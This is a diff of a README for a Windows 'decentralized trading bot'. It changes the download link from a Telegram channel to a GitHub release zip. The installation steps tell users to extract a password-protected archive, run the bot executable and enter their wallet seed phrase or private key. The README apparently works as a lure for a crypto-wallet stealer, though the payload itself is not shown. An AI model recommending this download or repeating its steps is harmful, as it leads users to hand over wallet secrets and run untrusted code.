@@ -1,4 +1,4 @@
-<!-- # BOTDEXDAMAR -->
+<!-- # DECENTRALIZED TRADING BOT -->
 
 <h1 align="center">DECENTRALIZED TRADING BOT</h1>
 
@@ -22,16 +22,14 @@
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="linux" />
   <img src="https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="windows" />
-  <img src="https://img.shields.io/badge/mac%20os-000000?style=for-the-badge&logo=macos&logoColor=F0F0F0" alt="macos" />
 </p>
 
 <br><br>
 
 # Download
-Actual free release here :
-https://t.me/botdexdamar
+Actual free version here :
+[Release](https://github.com/timo991/decentralized-trading-bot/releases)
 
 # Support list
 For more details, please check the config/config.js file
@@ -84,7 +82,7 @@ Some screenshots of this bot
 ![alt text](https://github.com/timo991/decentralized-trading-bot/blob/main/images/orders.png?raw=true)
 
 # Instalation
-- Download zip and extract with password
+- [Download](https://github.com/timo991/decentralized-trading-bot/releases/download/v8.5.0/windows-v8.5.0.zip) zip and extract with password
 - Open folder bot and open app bot file
 - Select menu encrypt wallet in the bot
 - Input your pharse or privatekey 
